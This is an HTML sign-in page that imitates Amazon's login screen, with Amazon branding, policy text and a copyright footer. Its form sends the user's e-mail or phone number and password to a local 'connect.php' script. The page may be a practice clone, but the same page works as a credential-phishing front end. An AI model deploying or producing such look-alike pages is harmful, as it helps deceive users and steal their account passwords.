<!DOCTYPE html>
<html>

<head>
	<title>Amazon Login</title>
	
  <link rel="shortcut icon" href="favicon2.ico" type="image/x-icon">  
	<link rel="stylesheet" type="text/css" href="css files/Sign_in_page.css">
</head>

<body>
	<div class='container'>
		<img src='Images/Home/logo5.jpg' id="logo" width="150px" height="45px">

		<div class="login">
			<div class="login_container">
				<p id='sign-in'>Sign-In</p>

				<form action = "connect.php" method="post">
					<label for="mobile_number" class='label_for'>Mobile Number or E-Mail</label>
					<div id='number'>
						<input type="text" class='input_type' name="mobile_number">
					</div>

					<label for="password" class='label_for'>Password</label>
						<input type="password" class='input_type' name="password">

						<button class="Sign_in_button">Sign-In</button>
				</form>

				<p>By creating an account or logging in, you agree to Amazon’s <span>Conditions of Use</span> and <span>Privacy
						Policy</span>.
				<p>Need Help?</p>
			</div>

			<div class = "create_account">
				<p>New to Amazon?</p>
				<a href="signup.php" target="_blank">Create your Amazon account</a>

			</div>
		</div>

		<div class = 'footer'>
		
			<a>Conditions of Use</a> 
			<a>Privacy Notice</a>
			<a>Help</a>

			<p>©1996-2022Amazon.com, Inc, or its affliates</p>

		</div>
	</div>
</body>

</html>